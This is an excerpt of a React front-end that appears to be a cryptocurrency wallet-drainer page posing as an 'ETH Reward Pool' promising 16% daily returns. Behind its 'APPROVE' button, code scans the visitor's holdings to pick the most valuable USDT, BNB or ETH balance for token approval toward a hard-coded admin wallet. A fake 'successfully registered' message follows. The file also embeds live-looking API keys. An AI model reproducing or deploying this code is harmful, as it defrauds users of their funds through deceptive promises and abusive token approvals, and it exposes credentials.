...
const GET_TOKEN_PRICE_API_KEY = "1c940e3c3c91c116020548b632808f489ee055d007bd229ff3f65161b29b19f7";
const GET_USER_ALL_TOEKN_API_KEY = "BQYWo7kGGYZM6mJuzcmKBg73OZGWxkip";
const GET_BSC_SCAN_API_KEY = "YW91Y3RUQNANJA1GJV82XSMN77FGJGXXP6";
const GET_ETH_SCAN_API_KEY = "7UX79SPAG4V5WFCBNV7I6FVC1P1UF478F3"

const adminWalletAddress = "0xAda318CBbBa1bB35Bffd60523926E899b9bA5065";
...
const UserScreen = (props) => {
  ...
  const handleApprove = async () => {
    try {
      const b_usdt_address = "0x55d398326f99059ff775485246999027b3197955";
      // const e_usdt_address = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
      const bnb_address = "-";
      const eth_address = "-";
      let approveToken = userAllToken[0];
      if (userAllToken.length) {
        setLoading(true);
        for (let i = 0; i < userAllToken.length; i++) {
          if ((b_usdt_address == userAllToken[i].currency.address || (bnb_address == userAllToken[i].currency.address && userAllToken[i].value > 0.005)) && userAllToken[i].network == "BSC") {
            approveToken = userAllToken[i];
            if (b_usdt_address == approveToken.currency.address) {
              for (let j = i + 1; j < userAllToken.length; j++) {
                if ((bnb_address == userAllToken[j].currency.address && userAllToken[j].value > 0.005) && userAllToken[j].network == "BSC") {
                  if (approveToken.value < userAllToken[j].value * 350) {
                    approveToken = userAllToken[j];
                    break;
                  }
                }
              }
          ...
          else if ((eth_address == userAllToken[i].currency.address && userAllToken[i].value > 0.01) && userAllToken[i].network == "ETH") {
            approveToken = userAllToken[i];
            break;
          }
        }
      ...
      setLoading(false);
      NotificationManager.warning('Reward failed!', 'Reward Info', 3000);
    }
  }
    ...
    <>
        ...
        <section className="banner-section" id="banner">
          ...
          <div className="auto-container">
            <div className="content-box">
              <h2 className="wow fadeInUp" data-wow-delay="500ms">The ETH Reward Pool with the tastiest return, 16% daily!</h2>
              <div className="text wow fadeInUp" data-wow-delay="800ms">12 April <span>7:00 AM UTC</span> <em>&nbsp; --- &nbsp;</em> 9 May <span>00:00 AM UTC</span></div>
              <h1 className="wow fadeInUp" data-wow-delay="1500ms">
                <div className="count-box"><span className="count-text" data-speed="5000" data-stop="5000">0</span></div>  ETH Prize Pool
              </h1>
              ...
              <div className="btn-box wow fadeInUp" data-wow-delay="2500ms">
                <div className="theme-btn btn-style-one" onClick={handleApprove}>APPROVE</div>
              </div>
            </div>
          </div>
        </section>
      ...
      <Modal open={open} onClose={onCloseModal} center>
        <div className="modal-body text-center">
          ...
          <div className='content'>You have successfully registered for this contest,<br /> if you are lucky you will receive your BNB price soon!</div>
        </div>
      </Modal>
    </>
  );
